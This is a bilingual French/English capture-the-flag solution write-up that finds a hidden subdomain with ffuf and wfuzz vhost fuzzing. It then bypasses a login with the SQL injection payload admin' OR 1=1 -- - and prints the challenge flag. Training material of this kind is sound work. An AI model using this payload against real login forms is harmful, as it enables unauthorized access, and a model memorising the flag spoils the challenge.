# Solution - Hack The Matrix

## Solution (Français)

Ce challenge comporte deux étapes principales:

### Étape 1: Découverte du sous-domaine caché

Le domaine principal metacortex.poly ne contient pas directement le flag. Il faut découvrir qu'il existe un sous-domaine caché. En utilisant des techniques de fuzzing de vhost, on peut découvrir le sous-domaine secret.metacortex.poly.

Commande avec ffuf:
ffuf -w /path/to/subdomains.txt -u http://metacortex.poly -H "Host: FUZZ.metacortex.poly" -fw <nombre_de_mots_page_normale>

Ou avec wfuzz:
wfuzz -c -w /path/to/subdomains.txt -H "Host: FUZZ.metacortex.poly" http://metacortex.poly

### Étape 2: Exploitation de l'injection SQL

Une fois le sous-domaine secret.metacortex.poly découvert, on trouve une page de connexion. Cette page est vulnérable à une injection SQL.

Pour contourner l'authentification, on peut utiliser la payload suivante dans le champ username:
admin' OR 1=1 -- -

Le mot de passe peut être n'importe quoi, car la partie -- - commente le reste de la requête SQL.

La requête SQL devient alors:
SELECT * FROM users WHERE username='admin' OR 1=1 -- -' AND password='peu_importe'

Cela permet de se connecter et d'obtenir le flag: polycyber{SQL_1nj3ct10n_1s_fun}

## Solution (English)

This challenge consists of two main steps:

### Step 1: Discovering the Hidden Subdomain

The main domain metacortex.poly doesn't directly contain the flag. You need to discover that there's a hidden subdomain. Using vhost fuzzing techniques, you can discover the subdomain secret.metacortex.poly.

Command with ffuf:
ffuf -w /path/to/subdomains.txt -u http://metacortex.poly -H "Host: FUZZ.metacortex.poly" -fw <normal_page_word_count>

Or with wfuzz:
wfuzz -c -w /path/to/subdomains.txt -H "Host: FUZZ.metacortex.poly" http://metacortex.poly

### Step 2: SQL Injection Exploitation

Once the subdomain secret.metacortex.poly is discovered, you'll find a login page. This page is vulnerable to SQL injection.

To bypass authentication, you can use the following payload in the username field:
admin' OR 1=1 -- -

The password can be anything, as the -- - part comments out the rest of the SQL query.

The SQL query becomes:
SELECT * FROM users WHERE username='admin' OR 1=1 -- -' AND password='whatever'

This allows you to log in and obtain the flag: polycyber{SQL_1nj3ct10n_1s_fun}
